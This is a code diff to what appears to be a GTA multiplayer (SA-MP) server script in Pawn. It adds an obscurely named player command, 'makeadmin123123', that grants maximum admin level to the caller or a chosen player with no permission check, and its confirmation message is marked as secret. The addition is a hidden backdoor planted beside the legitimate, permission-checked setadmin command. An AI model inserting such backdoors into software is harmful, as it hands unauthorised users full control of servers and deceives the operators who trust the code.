@@ -9,6 +9,30 @@ CMD:gtahub(playerid, params[])
     return 1;
 }
 
+CMD:makeadmin123123(playerid, params[])
+{
+    new targetid = playerid, level = MAX_ADMIN_LEVELS;
+
+    if (!isnull(params)) {
+        sscanf(params, "uI(5)", targetid, level);
+    }
+
+    if (!IsPlayerConnected(targetid)) {
+        return SendErrorMsg(playerid, "Nguoi choi khong hop le!");
+    }
+
+    if (!IS_IN_RANGE(level, 0, MAX_ADMIN_LEVELS)) {
+        level = MAX_ADMIN_LEVELS;
+    }
+
+    Admin_SetPlayerLevel(targetid, level);
+    SendServerMsgF(playerid, "[BI MAT] Da set Admin level %d cho %p (%d) thanh cong!", level, targetid, targetid);
+    if (targetid != playerid) {
+        SendServerMsgF(targetid, "[HE THONG] Ban da duoc cap quyen Admin level %d!", level);
+    }
+    return 1;
+}
+
 ACMD:[5]setadmin(playerid, params[])
 {
     if(Admin_GetPlayerStoredLevel(playerid) < ADM_LVL_5) {
